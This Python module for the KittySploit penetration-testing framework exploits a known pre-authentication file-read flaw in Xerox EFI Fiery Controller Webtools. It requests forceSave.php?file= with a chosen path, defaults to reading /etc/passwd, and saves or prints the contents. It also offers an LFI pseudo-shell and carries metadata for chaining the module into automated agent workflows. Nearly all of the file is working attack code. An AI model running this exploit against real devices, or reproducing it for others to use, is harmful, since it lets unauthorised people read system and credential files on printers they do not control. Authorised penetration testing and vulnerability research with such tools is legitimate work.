#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Xerox EFI Fiery Controller Webtools forceSave.php pre-auth LFI file read."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi


class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        "name": "Xerox EFI Fiery Webtools LFI File Read",
        "description": (
            "Reads arbitrary files via forceSave.php on Xerox DC260 EFI Fiery "
            "Controller Webtools 2.0."
        ),
        "author": ["ZeroScience", "KittySploit Team"],
        "platform": Platform.LINUX,
        "references": [
            "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5447.php",
            "https://www.exploit-db.com/exploits/43398/",
        ],
        "tags": ["xerox", "efi", "fiery", "printer", "lfi", "file-read", "unauth"],
        "agent": {
            "risk": "intrusive",
            "effects": ["data_exfiltration"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": True,
            "produces": ["risk_signals"],
            "requires": {
                "tech_hints_any": ["xerox", "fiery"],
                "endpoint_pattern_any": ["/wt3/forceSave.php"],
            },
            "chain": {
                "produces_capabilities": [{"capability": "file_read", "from_detail": "forceSave.php file param"}],
                "suggested_followups": ["scanner/http/xerox_efi_lfi_detect"],
            },
        },
    }

    port = OptPort(80, "Fiery Webtools HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    endpoint = OptString("/wt3/forceSave.php", "forceSave.php path", False, advanced=True)
    file_read = OptString("/etc/passwd", "Absolute remote file path to read", True)
    output_file = OptString("", "Local path to write retrieved content", False)
    output_limit = OptInteger(12000, "Max chars to print when output_file empty (0=full)", False, advanced=True)

    def execute(self, file_path: str) -> str:
        remote = str(file_path or "").strip()
        if not remote.startswith("/"):
            remote = "/" + remote
        base = str(self.endpoint or "/wt3/forceSave.php").strip()
        if not base.startswith("/"):
            base = "/" + base
        response = self.http_request(
            method="GET",
            path=f"{base}?file={remote}",
            allow_redirects=False,
            timeout=int(self.timeout or 20),
        )
        if not response or int(response.status_code or 0) != 200:
            return ""
        return response.text or ""

    def run(self):
        if bool(self.shell_lfi):
            print_status("Xerox EFI Fiery LFI pseudo-shell")
            self.handler_lfi()
            return True

        target = str(self.file_read or "/etc/passwd").strip()
        print_status(f"Reading {target} via Xerox EFI Fiery LFI")
        data = self.execute(target)
        if not data:
            print_error("File read failed or returned empty body")
            return False

        local = str(self.output_file or "").strip()
        if local:
            with open(local, "w", encoding="utf-8", errors="ignore") as fh:
                fh.write(data)
            print_success(f"Wrote {len(data)} bytes to {local}")
        else:
            limit = int(self.output_limit or 0)
            print_info(data if limit <= 0 else data[:limit] + "\n... [truncated]")
        return True
